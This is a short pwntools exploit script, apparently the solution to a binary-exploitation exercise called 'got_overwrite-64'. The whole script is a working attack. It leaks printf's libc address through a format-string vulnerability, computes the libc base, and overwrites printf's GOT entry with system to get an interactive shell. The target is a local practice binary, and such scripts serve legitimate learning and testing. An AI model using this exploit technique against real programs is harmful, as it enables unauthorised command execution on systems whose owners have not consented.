from pwn import *

elf = context.binary = ELF("./got_overwrite-64")

p = process()


payload = flat([
    "%7$s||||",
    elf.got["printf"]
])
p.sendline(payload)
printf_leak = u64(p.recv(6) + b"\00\00")

libc = elf.libc
libc.address = printf_leak - libc.sym["printf"]

payload = fmtstr_payload(6,{elf.got["printf"]: libc.sym["system"]})
p.sendline(payload)

p.interactive()